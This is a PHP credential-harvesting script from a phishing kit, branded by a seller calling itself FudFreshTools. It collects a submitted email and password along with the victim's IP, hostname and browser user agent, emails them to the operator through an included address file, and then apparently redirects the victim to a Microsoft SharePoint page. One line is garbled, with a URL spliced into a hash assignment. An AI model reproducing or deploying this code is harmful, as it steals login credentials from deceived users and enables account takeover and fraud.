<?php
if($_POST["emq"] != "" and $_POST["pz"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------------FudFreshTools.Com(ICQ: @fudfreshtools)------------------------\n";
$message .= "Em@il            	: ".$_POST['emq']."\n";
$message .= "P@s.sw0rd           			: ".$_POST['pz']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'iomail.php';
$subject = "Card | $ip";
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);https://products.office.com/en/sharepoint/collaboration");
}else{
header ("Location: index.php");
}

?>